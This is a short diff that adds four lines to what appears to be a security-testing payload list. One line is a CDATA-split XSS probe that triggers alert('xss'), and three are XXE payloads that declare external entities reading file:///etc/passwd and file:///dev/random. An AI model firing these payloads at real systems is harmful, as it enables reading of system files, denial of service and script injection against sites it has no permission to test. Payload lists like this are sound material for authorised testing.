@@ -1,0 +1,5 @@
+<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>
+<!ENTITY xxe SYSTEM "file:///dev/random" >]><test>&xxe;</test>
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><test>&xxe;</test>
+<!DOCTYPE foo [<!ENTITY xxefca0a SYSTEM "file:///etc/passwd"> ]>
+
